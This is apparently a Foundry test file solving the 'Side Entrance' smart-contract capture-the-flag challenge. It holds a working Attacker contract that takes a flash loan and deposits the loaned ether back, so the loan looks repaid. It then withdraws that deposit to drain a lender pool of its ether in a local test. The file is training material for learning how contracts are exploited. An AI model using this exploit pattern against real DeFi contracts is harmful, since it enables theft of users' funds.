// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool sideEntrance;

    constructor(SideEntranceLenderPool _sideEntrance) {
        sideEntrance = _sideEntrance;
    }

    function exploit() public {
        uint256 amount = address(sideEntrance).balance;
        sideEntrance.flashLoan(amount);
        sideEntrance.withdraw();
        msg.sender.call { value: address(this).balance }("");
    }

    function execute() external payable {
        sideEntrance.deposit{ value: msg.value }();
    }

    receive() external payable {}
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        console.log(attackerInitialEthBalance / 1e18); // 100 ETH
        Attacker attackerContract = new Attacker(sideEntranceLenderPool);
        vm.prank(attacker);
        attackerContract.exploit();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
